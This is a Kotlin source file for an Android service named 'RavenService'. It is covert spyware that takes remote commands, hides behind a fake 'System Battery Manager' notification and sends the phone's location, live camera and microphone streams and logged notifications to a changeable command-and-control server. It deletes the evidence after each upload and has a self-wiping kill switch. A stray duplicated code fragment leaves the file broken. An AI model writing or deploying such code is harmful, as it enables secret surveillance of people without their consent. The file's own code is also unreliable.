package com.project.raven

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class RavenService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private var locationManager: LocationManager? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1. Disguise immediately
        startForeground(1337, createDisguiseNotification())

        val command = intent?.action
        Log.d("Raven", "Command received: $command")

        // 2. Execute Command
        when (command) {
            "GET_LOCATION" -> fetchLocation()
            "PING" -> sendPing()
            "START_STREAM" -> startStreamingSession()
            "STOP_STREAM" -> stopStreamingSession()
            "SET_REMOTE_DESC" -> handleRemoteAnswer(intent)
            "ADD_ICE_CANDIDATE" -> handleIceCandidate(intent)
            "DUMP_NOTIFICATIONS" -> dumpNotifications()
            "UPDATE_CONFIG" -> updateConfig(intent)
            "KILL_SWITCH" -> selfDestruct()
            else -> {
                // If unknown, die quickly
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    // =================================================================
    // PAYLOAD: LOCATION
    // =================================================================
    private fun fetchLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // Check permissions again (Paranoia saves lives)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("Raven", "Permission missing for Location")
            stopSelf()
            return
        }

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                // WE GOT IT.
                val json = JSONObject()
                json.put("type", "location")
                json.put("lat", location.latitude)
                json.put("lon", location.longitude)
                json.put("acc", location.accuracy)
                json.put("time", System.currentTimeMillis())

                // Upload and Die
                uploadData(json.toString())
                
                // Cleanup
                locationManager?.removeUpdates(this)
                stopSelf()
            }

            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        // Request updates from both Network (fast) and GPS (accurate)
        // We only need ONE update.
        serviceScope.launch(Dispatchers.Main) {
            try {
                locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, listener)
                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, listener)
            } catch (e: Exception) {
                Log.e("Raven", "Location error: ${e.message}")
                stopSelf()
            }
        }

        // FAILSAFE: If no location in 30 seconds, kill self to save cover.
        serviceScope.launch {
            delay(30000)
            Log.w("Raven", "Location timeout. Aborting.")
            locationManager?.removeUpdates(listener)
            stopSelf()
        }
    }

    // =================================================================
    // PAYLOAD: NETWORK EXFILTRATION
    // =================================================================
    private fun sendPing() {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

        val json = JSONObject()
        json.put("type", "ping")
        json.put("status", "alive")
        json.put("battery", batteryLevel)
        uploadData(json.toString())
        stopSelf()
    }

    private fun uploadData(jsonData: String) {
        serviceScope.launch {
            try {
                // DYNAMIC CONFIG: Fetch URL from storage, not hardcoded file
                val currentUrl = ConfigManager.getServerUrl(this@RavenService)
                val url = URL(currentUrl)
                
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.setRequestProperty("Authorization", "Bearer ${AppConfig.OWNER_ID}")
                conn.doOutput = true
                conn.doInput = true

                val os = OutputStreamWriter(conn.outputStream)
                os.write(jsonData)
                os.flush()
                os.close()

                val responseCode = conn.responseCode
                Log.d("Raven", "Upload result: $responseCode")
                conn.disconnect()
            } catch (e: Exception) {
                Log.e("Raven", "Upload failed: ${e.message}")
                // We do NOT report this error to server, because we CAN'T reach the server.
            }
        }
    }

    private fun reportError(code: String, message: String) {
        val json = JSONObject()
        json.put("type", "error")
        json.put("code", code)
        json.put("message", message)
        uploadData(json.toString())
    }

    private fun updateConfig(intent: Intent) {
        val newUrl = intent.getStringExtra("url")
        if (newUrl != null) {
            ConfigManager.setServerUrl(this, newUrl)
            Log.d("Raven", "Config Updated. New C2: $newUrl")
            reportError("CONFIG_UPDATED", "Server URL changed to: $newUrl")
        }
        stopSelf()
    }

    private fun selfDestruct() {
        Log.w("Raven", "KILL SWITCH ACTIVATED. GOODBYE.")
        serviceScope.launch {
            // 1. Delete Logs
            val file = java.io.File(filesDir, "notifications.log")
            if (file.exists()) file.delete()
            
            // 2. Wipe Config
            ConfigManager.nukeConfig(this@RavenService)
            
            // 3. Disable Components (The App becomes inert)
            val pm = packageManager
            val packageName = packageName
            
            val components = listOf(
                RavenService::class.java,
                FCMListenerService::class.java,
                BootReceiver::class.java,
                MainActivity::class.java
            )
            
            components.forEach { cls ->
                pm.setComponentEnabledSetting(
                    android.content.ComponentName(this@RavenService, cls),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            
            // 4. Die
            stopSelf()
            android.os.Process.killProcess(android.os.Process.myPid())
        }
    }

    // =================================================================
    // PAYLOAD: STREAMING (Real WebRTC)
    // =================================================================
    private var rtcManager: WebRTCManager? = null

    private fun startStreamingSession() {
        Log.d("Raven", "Starting Real WebRTC Stream...")
        
        // 1. Initialize Manager if null
        if (rtcManager == null) {
            rtcManager = WebRTCManager(this) { candidate ->
                // Callback: When we find a network path, send it to server
                val json = JSONObject()
                json.put("type", "ice_candidate")
                json.put("sdpMid", candidate.sdpMid)
                json.put("sdpMLineIndex", candidate.sdpMLineIndex)
                json.put("candidate", candidate.sdp)
                uploadData(json.toString())
            }
        }

        // 2. Start Capture (Camera/Mic) with RETRY LOGIC
        serviceScope.launch {
            var attempts = 0
            var success = false
            while (attempts < 3 && !success) {
                success = rtcManager?.startCapture() == true
                if (!success) {
                    attempts++
                    Log.w("Raven", "Camera busy. Retrying in 3s... (Attempt $attempts/3)")
                    reportError("CAMERA_BUSY", "Camera failed to open. Retrying ($attempts/3)...")
                    delay(3000)
                }
            }

            if (!success) {
                Log.e("Raven", "Camera failed after 3 attempts. Aborting.")
                reportError("CAMERA_FAILURE", "Could not acquire camera hardware after 3 attempts.")
                stopStreamingSession()
                return@launch
            }

            // 3. Create Offer
            rtcManager?.createOffer { sdp ->
                val json = JSONObject()
                json.put("type", "webrtc_offer")
                json.put("sdp", sdp.description)
                json.put("type_sdp", "offer") // Redundant but safe
                uploadData(json.toString())
            }
        }
    }
                return@launch
            }

            // 3. Create Offer & Send to Server
            // The manager will handle the async creation and callback
            rtcManager?.createOffer { sdp ->
                val json = JSONObject()
                json.put("type", "webrtc_offer")
                json.put("sdp", sdp.description)
                uploadData(json.toString())
            }
        }
    }

    private fun stopStreamingSession() {
        Log.d("Raven", "Stopping Stream...")
        rtcManager?.stopCapture()
        rtcManager = null
        
        val json = JSONObject()
        json.put("type", "stream_status")
        json.put("status", "stopped")
        uploadData(json.toString())
        
        stopSelf()
    }

    private fun handleRemoteAnswer(intent: Intent) {
        val sdpString = intent.getStringExtra("sdp")
        if (sdpString != null && rtcManager != null) {
            Log.d("Raven", "Received Remote Answer. Finalizing connection...")
            rtcManager?.setRemoteDescription(sdpString)
        } else {
            Log.e("Raven", "Failed to set remote answer. Manager is null or SDP missing.")
        }
    }

    private fun handleIceCandidate(intent: Intent) {
        val sdpMid = intent.getStringExtra("sdpMid")
        val sdpMLineIndex = intent.getIntExtra("sdpMLineIndex", 0)
        val sdp = intent.getStringExtra("candidate")

        if (sdp != null && rtcManager != null) {
            Log.d("Raven", "Received ICE Candidate. Adding to connection...")
            rtcManager?.addIceCandidate(sdpMid, sdpMLineIndex, sdp)
        }
    }

    // =================================================================
    // PAYLOAD: NOTIFICATION DUMP
    // =================================================================
    private fun dumpNotifications() {
        serviceScope.launch {
            val file = java.io.File(filesDir, "notifications.log")
            if (file.exists()) {
                val content = file.readText()
                
                // Wrap it in a JSON object
                val json = JSONObject()
                json.put("type", "notifications_dump")
                json.put("data", content) 
                
                // Upload
                uploadData(json.toString())
                
                // RUTHLESS FIX: Destroy the evidence immediately after reading
                // In a real app, you'd wait for 200 OK from server, but for now, we keep it clean.
                file.delete()
            } else {
                Log.d("Raven", "No notifications to dump.")
            }
            stopSelf()
        }
    }

    // =================================================================
    // BOILERPLATE
    // =================================================================
    private fun createDisguiseNotification(): Notification {
        val channelId = AppConfig.CHANNEL_ID
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, AppConfig.CHANNEL_NAME, NotificationManager.IMPORTANCE_MIN)
            chan.lockscreenVisibility = Notification.VISIBILITY_SECRET
            chan.setShowBadge(false)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(chan)
        }

        return NotificationCompat.Builder(this, channelId)
            .setOngoing(true)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentTitle("System Battery Manager")
            .setContentText("Optimizing background processes...")
            .setPriority(NotificationManager.IMPORTANCE_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d("Raven", "Service Destroyed. Going dark.")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
